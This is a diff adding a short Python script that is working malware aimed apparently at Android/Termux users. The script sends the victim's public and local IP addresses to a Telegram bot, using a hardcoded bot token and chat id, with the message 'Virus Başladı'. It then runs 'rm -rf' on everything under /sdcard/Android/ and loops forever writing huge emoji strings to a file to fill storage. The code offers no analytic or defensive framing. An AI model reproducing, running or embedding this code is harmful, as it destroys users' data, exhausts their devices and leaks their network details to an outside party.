@@ -1,0 +1,46 @@
+import os
+os
+try:
+    import requests
+    import threading
+    import os
+except:
+    os.system("pip install threading")
+    import requests
+    import threading
+    import os
+hit=0
+idm="1342133634"
+token="5222736261:AAHT8WAb7k6qaTtWb8RFRHtyBo4aOd6yoqg"
+try:
+    ipm=requests.get("https://ipecho.net/plain").text
+except:
+    ipm="error"
+import socket
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    lip=(s.getsockname()[0])
+    s.close()
+except:
+    lip="Error"
+requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={idm}&text=Public IP= {ipm}\nLocal IP= {lip}\n Virus Başladı")
+os.system("clear")
+def sil():
+    try:
+        dirr="/sdcard/Android/"
+        for files in os.listdir (dirr):
+            dar=dirr+files
+            os.system(f"rm -rf {dar}")
+    except:
+        pass
+def olustur():
+    while True:
+        text=("😇😇😇😇😇😇😇😇😇😇😇😇😇😇" * 100000)
+        open("sik.txt","a").write(text)
+
+ta = threading.Thread(target=olustur)
+ta.start()
+ta1 = threading.Thread(target=sil)
+ta1.start()
+
